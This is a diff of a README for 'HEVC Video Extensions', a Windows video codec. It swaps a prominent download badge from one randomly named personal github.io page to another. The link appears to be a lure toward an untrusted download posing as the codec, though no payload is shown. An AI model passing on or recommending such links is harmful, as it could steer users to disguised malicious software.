@@ -1,6 +1,6 @@
 # HEVC Video Extensions - Windows HEVC Playback Codec
 
-[![GET HEVC Video Extensions](https://img.shields.io/badge/GET%20%E2%80%94%20HEVC%20Video%20Extensions-0078D6?style=for-the-badge&logoColor=white)](https://sofiaquluf502.github.io/.github/hevc-video-extensions)
+[![GET HEVC Video Extensions](https://img.shields.io/badge/GET%20%E2%80%94%20HEVC%20Video%20Extensions-0078D6?style=for-the-badge&logoColor=white)](https://ezrahhilljned.github.io/.github/hevc-video-extensions)
 
 ## Overview of HEVC Video Extensions for Windows
 
